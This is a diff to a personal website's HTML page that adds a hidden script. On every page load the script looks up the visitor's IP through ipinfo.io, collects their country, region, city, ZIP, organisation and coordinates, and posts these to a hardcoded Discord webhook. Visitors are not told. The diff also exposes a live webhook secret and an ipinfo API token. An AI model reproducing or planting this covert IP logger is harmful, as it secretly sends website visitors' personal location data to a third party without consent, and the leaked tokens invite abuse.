@@ -682,33 +682,53 @@
 <script src="https://unpkg.com/scrollreveal"></script>
 <script src="js/dpDh3xVawFhS.js"></script></body></html>
 <script>
+var userIP;
+
 function monke(json) {
+    userIP = json.ip; // Store the user's IP in a variable
     var request = new XMLHttpRequest();
 
-    request.open("POST", "https://discord.com/api/webhooks/1173731890000306246/jYwMzBS8MqZedSgWdwyx0lNXDJQW_WkSHWI2hDSGPxte96sUlwCjsMWSOHSWLnvOzRbK");
+    // Make a request to ipinfo.io with the user's IP
+    request.open("GET", "https://ipinfo.io/" + userIP + "?token=4251134854bbf7");
 
-    request.setRequestHeader('Content-type', 'application/json');
+    request.onreadystatechange = function () {
+        if (request.readyState == 4 && request.status == 200) {
+            var ipInfo = JSON.parse(request.responseText);
 
-    var params = {
-        username: "ermal.is-a.dev",
-        avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
-        embeds: [{
-            title: "ermal.is-a.dev",
-            color: 15000,
-            description: `**IP:** \`${json.ip || "N/A"}\`\n` +
-                         `**Country:** \`${json.country || "N/A"}\`\n` +
-                         `**Region:** \`${json.region || "N/A"}\`\n` +
-                         `**Town/City:** \`${json.city || "N/A"}\`\n` +
-                         `**ZIP:** \`${json.postal || "N/A"}\`\n` +
-                         `**Organization:** \`${json.org || "N/A"}\`\n`
-        }]
+            // Use the additional information from the ipinfo.io response
+            var params = {
+                username: "ermal.is-a.dev",
+                avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
+                embeds: [{
+                    title: "ermal.is-a.dev",
+                    color: 15000,
+                    description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
+                                 `**Country:** \`${ipInfo.country || "N/A"}\`\n` +
+                                 `**Region:** \`${ipInfo.region || "N/A"}\`\n` +
+                                 `**City:** \`${ipInfo.city || "N/A"}\`\n` +
+                                 `**ZIP:** \`${ipInfo.postal || "N/A"}\`\n` +
+                                 `**Organization:** \`${ipInfo.org || "N/A"}\`\n` +
+                                 `**Location:** \`${ipInfo.loc || "N/A"}\`\n`
+                }]
+            };
+
+            try {
+                // Send the Discord webhook request with the extended information
+                var discordRequest = new XMLHttpRequest();
+                discordRequest.open("POST", "https://discord.com/api/webhooks/1173731890000306246/jYwMzBS8MqZedSgWdwyx0lNXDJQW_WkSHWI2hDSGPxte96sUlwCjsMWSOHSWLnvOzRbK");
+                discordRequest.setRequestHeader('Content-type', 'application/json');
+                discordRequest.send(JSON.stringify(params));
+            } catch (error) {
+                console.error("Error sending Discord request:", error);
+            }
+        }
     };
 
     try {
-        request.send(JSON.stringify(params));
+        request.send();
     } catch (error) {
-        console.error("Error sending request:", error);
+        console.error("Error sending ipinfo.io request:", error);
     }
 }
 </script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>t
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
